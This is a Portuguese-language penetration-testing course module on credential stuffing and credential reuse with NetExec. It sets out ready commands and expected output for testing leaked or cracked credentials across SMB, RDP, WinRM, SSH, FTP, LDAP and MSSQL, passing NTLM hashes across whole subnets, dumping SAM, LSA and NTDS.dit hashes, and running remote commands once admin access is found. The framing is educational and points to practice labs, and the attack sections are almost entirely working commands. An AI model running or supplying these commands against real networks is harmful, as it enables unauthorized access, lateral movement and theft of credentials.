# 🔁 04. Credential Stuffing e Reuso de Credenciais

> Uma senha quebrada em SSH pode funcionar em SMB, RDP, WinRM e FTP. Reuso de credenciais é o vetor que transforma 1 acesso em acesso lateral a toda a rede.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 45min | ⭐⭐⭐ Intermediário | `netexec` |

</div>

---

## 🎓 Por que isso importa?

Credential stuffing é a injeção automatizada de **pares usuário:senha vazados de outros breaches** em forms de login. Reuso de credenciais é quando uma senha válida de um serviço é testada em outros serviços da mesma rede. Segundo o Verizon DBIR 2025, **82% dos compromissos envolvem credenciais reutilizadas**.

**Diferença fundamental (revisão do arquivo 03):**

| Password Spraying (arquivo 03) | Credential Stuffing (este arquivo) |
|:-------------------------------|:-----------------------------------|
| Usa senhas **adivinhadas/comuns** | Usa pares usuário:senha **vazados/conhecidos** |
| Não conhece as credenciais previamente | Já tem as credenciais (de breaches anteriores) |
| Testa 1 senha em muitos usuários | Testa pares específicos em múltiplos serviços |
| MITRE: T1110.003 | MITRE: T1110.004 |

**Exemplo prático:**
- Senha `Summer2025!` vazada do LinkedIn → testar em `admin@empresa.com:Summer2025!` no SSH, SMB, RDP, WinRM
- Se o admin usou a mesma senha em múltiplos serviços → acesso lateral instantâneo

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| Enumeração de usuários | Sim | Arquivo 02 deste módulo |
| Password spraying básico | Sim | Arquivo 03 deste módulo |
| NetExec/NetExec básico | Sim | Arquivo 03 deste módulo |

---

## 🎯 Quando usar este módulo

- Quando obteve credenciais de um breach anterior ou de outro host
- Quando encontrou hash NTLM e quer testar em múltiplos serviços
- Quando quer validar se credenciais de um serviço funcionam em outros (cross-service)
- Quando tem pares usuário:senha específicos para testar (não wordlist genérica)

---

## 🔄 Como funciona na prática

```
┌──────────────────────────────────────────────────────────┐
│  1. OBTER CREDENCIAIS                                    │
│     - Breach anterior (dumps de sites comprometidos)     │
│     - Hash NTLM extraído de outro host (secretsdump)     │
│     - Credenciais encontradas em arquivos/config         │
│     - Senha quebrada com Hydra (arquivo 03)              │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  2. TESTAR CROSS-SERVICE COM NetExec                     │
│     - SMB, RDP, WinRM, SSH, FTP, LDAP, MSSQL            │
│     - Em hosts individuais e subnets inteiras            │
│     - --continue-on-success para ver TODOS os hits       │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  3. ESCALAR OU PIVOTAR                                   │
│     - Se encontrou admin local (Pwn3d!) → executar cmd   │
│     - Se encontrou em SMB → tentar PtH (arquivo 06)      │
│     - Se encontrou em WinRM → shell remota               │
└──────────────────────────────────────────────────────────┘
```

---

## 🛠️ Ferramenta Principal

| Ferramenta | Quando usar |
|:-----------|:------------|
| **NetExec (nxc)** | Validação em massa, múltiplos protocolos, subnets inteiras |

> **Nota:** CrackMapExec (CME) foi descontinuado em set/2023. NetExec é o sucessor ativo. Sintaxe praticamente idêntica.

### Instalação

```bash
# Kali Linux (recomendado)
sudo apt install -y netexec

# Verificar versão
nxc --version
```

---

## 🔐 Passo 1: Validar Credenciais em Host Único

### Comando base

```bash
nxc <protocolo> <alvo> -u <usuario> -p <senha>
```

### Exemplo SMB — verificar se credencial funciona

```bash
nxc smb 192.168.1.10 -u Administrator -p 'Winter2025!'
```

**✅ Output esperado (SUCESSO com admin):**
```
SMB  192.168.1.10  445  FILESRV01  [*] Windows 10.0 Build 17763 x64 (name:FILESRV01) (domain:EMPRESA.LOCAL) (signing:True) (SMBv1:False)
SMB  192.168.1.10  445  FILESRV01  [+] EMPRESA.LOCAL\Administrator:Winter2025! (Pwn3d!)
```

**O que procurar:** `(Pwn3d!)` = usuário tem acesso de **admin local** → pode executar comandos remotamente.

**✅ Output esperado (SUCESSO sem admin):**
```
SMB  192.168.1.10  445  FILESRV01  [+] EMPRESA.LOCAL\joao:Winter2025!
```

**❌ Output esperado (FALHA):**
```
SMB  192.168.1.10  445  FILESRV01  [-] EMPRESA.LOCAL\pedro:Winter2025!
```

---

## 🔐 Passo 2: Testar Cross-Service em Host Único

Testar a **mesma credencial** em múltiplos protocolos do mesmo host:

```bash
# SMB
nxc smb 192.168.1.10 -u admin -p 'Empresa2025!' --continue-on-success

# RDP
nxc rdp 192.168.1.10 -u admin -p 'Empresa2025!' --continue-on-success

# WinRM
nxc winrm 192.168.1.10 -u admin -p 'Empresa2025!' --continue-on-success

# SSH
nxc ssh 192.168.1.10 -u admin -p 'Empresa2025!' --continue-on-success

# FTP
nxc ftp 192.168.1.10 -u admin -p 'Empresa2025!' --continue-on-success

# LDAP
nxc ldap 192.168.1.10 -u admin -p 'Empresa2025!' -d EMPRESA.LOCAL --continue-on-success

# MSSQL
nxc mssql 192.168.1.10 -u admin -p 'Empresa2025!' --continue-on-success
```

**✅ Output esperado (exemplo de enumeração completa):**
```
SMB   192.168.1.10  445   FILESRV  [+] EMPRESA.LOCAL\admin:Empresa2025! (Pwn3d!)
WINRM 192.168.1.10  5985  FILESRV  [+] EMPRESA.LOCAL\admin:Empresa2025! (Pwn3d!)
SSH   192.168.1.10  22    FILESRV  [+] admin:Empresa2025! (Pwn3d!)
RDP   192.168.1.10  3389  FILESRV  [+] EMPRESA.LOCAL\admin:Empresa2025!
FTP   192.168.1.10  21    FILESRV  [+] admin:Empresa2025!
```

**O que procurar:** Se a mesma credencial funciona em SMB + WinRM → temos acesso remoto total (shell via PowerShell).

---

## 🔐 Passo 3: Reuso de Credenciais em Subnet Inteira

### Variante 1 — Testar hash NTLM em subnets

```bash
nxc smb 192.168.1.0/24 -u Administrator -H :5fbc3d5fec8206a30f4b6c473d68ae76 --continue-on-success
```

**✅ Output esperado:**
```
SMB  192.168.1.10  445  DC01       [+] EMPRESA.LOCAL\Administrator:5fbc3d5fec8206a30f4b6c473d68ae76 (Pwn3d!)
SMB  192.168.1.11  445  FILESRV01  [+] EMPRESA.LOCAL\Administrator:5fbc3d5fec8206a30f4b6c473d68ae76 (Pwn3d!)
SMB  192.168.1.20  445  WEBSRV01  [-] EMPRESA.LOCAL\Administrator:5fbc3d5fec8206a30f4b6c473d68ae76
SMB  192.168.1.30  445  DESKTOP01 [-] EMPRESA.LOCAL\Administrator:5fbc3d5fec8206a30f4b6c473d68ae76
```

> **Nota:** `[Pwn3d!]` em DC01 = Domain Admin! Podemos dumpar NTDS.dit.

### Variante 2 — Testar pares usuário:senha (1:1)

```bash
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

### Variante 3 — Múltiplos protocolos em subnets

```bash
nxc smb   192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
nxc winrm 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
nxc ssh   192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
nxc rdp   192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

---

## 🔐 Passo 4: Usar Credenciais Encontradas

### Dump de hashes via SMB (se admin local)

```bash
# SAM dump
nxc smb 192.168.1.10 -u Administrator -p 'Winter2025!' --sam --local-auth

# LSA dump
nxc smb 192.168.1.10 -u Administrator -p 'Winter2025!' --lsa

# NTDS.dit (Domain Controller)
nxc smb 192.168.1.10 -u Administrator -p 'Winter2025!' --ntds
```

### Executar comandos remotos

```bash
# Via SMB (cmd.exe)
nxc smb 192.168.1.10 -u Administrator -p 'Winter2025!' -x "whoami"

# Via SMB (PowerShell)
nxc smb 192.168.1.10 -u Administrator -p 'Winter2025!' -X "Get-Process"

# Via WinRM
nxc winrm 192.168.1.10 -u Administrator -p 'Winter2025!' -x "whoami"
```

---

## 📋 Resumo: Cenários de Uso

| Cenário | Comando |
|:--------|:--------|
| Credencial de breach em 1 host | `nxc smb <IP> -u user -p pass` |
| Hash NTLM em subnet | `nxc smb <subnet> -u Administrator -H :NTHASH --continue-on-success` |
| Pares 1:1 em hosts | `nxc smb targets.txt -u users.txt -p passwords.txt --no-bruteforce --continue-on-success` |
| Cross-service completo | Rodar nxc em SMB, RDP, WinRM, SSH, FTP |
| Dump de hashes após acesso | `nxc smb <IP> -u Admin -p pass --sam --lsa --ntds` |
| Comandos remotos | `nxc smb <IP> -u Admin -p pass -x "whoami"` |

---

## ❌ Erros Comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| `[-] STATUS_LOGON_FAILURE` | Credencial inválida ou usuário não existe | Verificar user:pass; testar com outro protocolo |
| `(Pwn3d!)` não aparece | Usuário não é admin local | Testar outro user; tentar PtH com hash |
| `[-] STATUS_ACCOUNT_LOCKED_OUT` | Conta bloqueada por lockout | Aguardar duração do lockout; usar menos tentativas |
| `--continue-on-success` não mostra todos | Flag ausente | Adicionar `--continue-on-success` |
| NetExec não conecta em WinRM | WinRM não habilitado | Verificar porta 5985/5986; tentar SMB |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Active Directory Basics](https://tryhackme.com/room/adbasics) | Credenciais, reuso, enumeração de AD | 45min |
| 2 | TryHackMe | [Internal](https://tryhackme.com/room/internal) | Credenciais encontradas em config, reuso cross-service | 60min |
| 3 | HackTheBox | [Archetype](https://app.hackthebox.com/machines/Archetype) | Credenciais em backup, reuso SMB → MSSQL | 90min |

---

## 📚 Referências

- [NetExec Wiki — Password Spraying](https://www.netexec.wiki/smb-protocol/password-spraying)
- [MITRE ATT&CK — Credential Stuffing (T1110.004)](https://attack.mitre.org/techniques/T1110/004)
- [MITRE ATT&CK — Password Spraying (T1110.003)](https://attack.mitre.org/techniques/T1110/003)
- [OWASP — Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)
- [NetExec Cheatsheet](https://github.com/CPO-EH/netexec-cheat-sheet)
- [Kali Linux — NetExec](https://www.kali.org/tools/netexec)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Diferenciar credential stuffing de password spraying
- [ ] Usar NetExec para validar pares usuário:senha em múltiplos protocolos
- [ ] Testar credenciais cross-service (SMB, RDP, WinRM, SSH, FTP)
- [ ] Usar `--continue-on-success` para ver todos os hits
- [ ] Executar comandos remotos após encontrar admin local
- [ ] Dumpar hashes (SAM, LSA, NTDS) com NetExec
- [ ] Entender quando usar `--no-bruteforce` vs brute force normal
